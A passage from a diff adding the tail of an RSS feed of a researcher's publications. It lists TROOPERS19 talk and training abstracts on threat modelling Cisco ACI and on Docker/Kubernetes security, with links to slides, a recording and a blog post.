+&lt;li&gt;Technican, Project Manager &amp;amp; IT Manager&lt;/li&gt;
+&lt;li&gt;IT security officers&lt;/li&gt;
+&lt;li&gt;Security Architects &amp;amp; Developers&lt;/li&gt;
+&lt;li&gt;Infrastructure Engineers &amp;amp; Architects&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;REASONS TO PARTICIPATE&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Software development and operation is currently subject to rapid evolution, which breaks with familiar concepts and requires the development of new concepts for the integration of security processes into the development cycle. Learn directly what (positive and negative) developments experts in safety testing have observed in the recent past and discuss together the advantages and disadvantages of different approaches.&lt;/p&gt;
+&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.ish-muc.com/summit#Docker&#34;&gt;ISH Page&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    
+    <item>
+      <title>TROOPERS19</title>
+      <link>http://nodyhub.github.io/publication/2019-troopers/</link>
+      <pubDate>Wed, 20 Mar 2019 00:00:00 +0000</pubDate>
+      
+      <guid>http://nodyhub.github.io/publication/2019-troopers/</guid>
+      <description>&lt;p&gt;Heidelberg, Germany&lt;/p&gt;
+&lt;h2 id=&#34;threat-modelling-and-beyond-for-cisco-aci&#34;&gt;Threat Modelling and Beyond for Cisco ACI&lt;/h2&gt;
+&lt;p&gt;Frank Block &amp;amp; Jan Harrie&lt;/p&gt;
+&lt;h3 id=&#34;abstract&#34;&gt;Abstract&lt;/h3&gt;
+&lt;p&gt;Cisco Application Centric Infrastructure (ACI) is one of the major solutions in the era of software-defined networking (SDN). Overall, it consists of a) leaf &amp;amp; spine switches (running NX-OS) to connect different endpoints and enforce filtering rules and b) a cluster of Application Policy Infrastructure Controllers to manage the SDN. Such a modern networking approach comes, of course, with its own threats and risks.&lt;/p&gt;
+&lt;p&gt;To better understand the threat landscape in the case of the Cisco ACI solution, we performed a first deeper analysis of the system. In this lightning talk we will present the current research results on a theoretical and technical level, existing challenges, and a forecast of the next steps.&lt;/p&gt;
+&lt;h3 id=&#34;media&#34;&gt;Media&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;../TROOPERS19_DM_Threat_Modelling_Cisco_ACI.pdf&#34;&gt;Slides&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=2KX3CNDz9PE&#34;&gt;Recording&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;docker-kubernetes--security-in-enterprise-environments&#34;&gt;Docker, Kubernetes &amp;amp; Security in Enterprise Environments&lt;/h2&gt;
+&lt;p&gt;Simon Janz &amp;amp; Jan Harrie&lt;/p&gt;
+&lt;h3 id=&#34;abstract-1&#34;&gt;Abstract&lt;/h3&gt;
+&lt;p&gt;Container, Microservices, Kubernetes - all of those terms heavily dominate modern application development teams and processes. This training will explain the key technologies behind those terms and focus on the following main questions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How strong and reliable are the isolation capabilities of Docker/Linux/OS containers?&lt;/li&gt;
+&lt;li&gt;How do containers affect typical application and network architectures?&lt;/li&gt;
+&lt;li&gt;How does Kubernetes affect application deployments and workflows?&lt;/li&gt;
+&lt;li&gt;How is “security” integrated into those paradigms?&lt;/li&gt;
+&lt;li&gt;What additional attack surface and security challenges are introduced by the changed development landscape and additional tools?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;All agenda topics will be supported by practical exercises and/or demos. At the end of the training, each attendee will have knowledge about the described buzzwords and tools and understand how they impact application architectures, development, and security posture. Additionally, a fully functional Kubernetes cluster is built, as well as relevant security measures implemented and discussed.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Who should attend this training and why?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;IT Security Professionals who want to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;understand the technology behind the recent and common buzzwords listed above,&lt;/li&gt;
+&lt;li&gt;be able to evaluate the isolation capabilities of container solutions,&lt;/li&gt;
+&lt;li&gt;get ideas on how to integrate security into typical DevOps environments and continuous workflows.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Software Architects and Developers who want to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;learn about potential security vulnerabilities in common practices and tools,&lt;/li&gt;
+&lt;li&gt;understand the concerns of the security people,&lt;/li&gt;
+&lt;li&gt;improve their development chain by adding automated security checks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Due to the large amount of tools and technologies, this training will not be able to cover security aspects of every single technology in detail. However, we are happy to receive specific questions before the training to potentially prepare additional material and you will get an overview how to approach unknown/new technologies from a security perspective.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Requirements&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The attendees should have:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;intermediate knowledge of the Linux bash and a command line-based text editor (e.g. nano or vim)&lt;/li&gt;
+&lt;li&gt;a system with WLAN and an SSH client (i.e. PuTTY) which is able to connect via SSH to systems in the Internet.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For the exercises, we provide the needed infrastructure in a cloud environment which the attendees can connect to via SSH.&lt;/p&gt;
+&lt;h3 id=&#34;media-1&#34;&gt;Media&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://insinuator.net/2019/01/tr19-training-k8/&#34;&gt;Blogpost&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
